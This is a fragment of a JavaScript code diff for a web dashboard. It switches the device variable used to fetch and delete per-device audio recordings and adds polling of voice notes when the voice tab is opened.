+    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
     if (!data || typeof data !== 'object') {
       list.innerHTML = '<div class="label">No remote recordings yet</div>';
       return;
@@ -3402,19 +3578,19 @@ function formatDuration(sec) {
   const s = sec % 60;
   return `${m}:${s.toString().padStart(2, '0')}`;
 }async function deleteRecording(recordingId) {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
   if (!confirm('Delete this recording?')) return;
   
   try {
     // Delete from Storage
-    const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
+    const rec = await fetchRTDB(`devices/${recordingDevice}/recordings/${recordingId}`);
     if (rec && rec.parts) {
       for (const partPath of rec.parts) {
         await deleteStorageFile(partPath);
       }
     }
     // Delete from RTDB
-    await deleteRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
+    await deleteRTDB(`devices/${recordingDevice}/recordings/${recordingId}`);
     showAlert('Recording deleted', 'warn');
     await fetchRecordings();
   } catch (e) {
@@ -3440,11 +3616,11 @@ async function deleteStorageFile(storagePath) {
 
 async function deleteRecordingsFromStorage() {
   try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`, 'shallow=true');
+    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`, 'shallow=true');
     if (!data || typeof data !== 'object') return;
     
     for (const key of Object.keys(data)) {
-      const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${key}`);
+      const rec = await fetchRTDB(`devices/${recordingDevice}/recordings/${key}`);
       if (rec && rec.parts) {
         for (const partPath of rec.parts) {
           await deleteStorageFile(partPath);
@@ -3462,9 +3638,10 @@ async function getAuthToken() {
   return null;
 }
 
-// Override the voice tab click handler to also fetch recordings
+// Override the voice tab click handler to fetch recordings and voice notes
 document.querySelector('[data-tab="voice"]').addEventListener('click', () => {
   setTimeout(pollRecordings, 100);
+  setTimeout(pollVoiceNotes, 200);
 });
 
 async function estimateNodeSize(path, sampleSize = 3) {
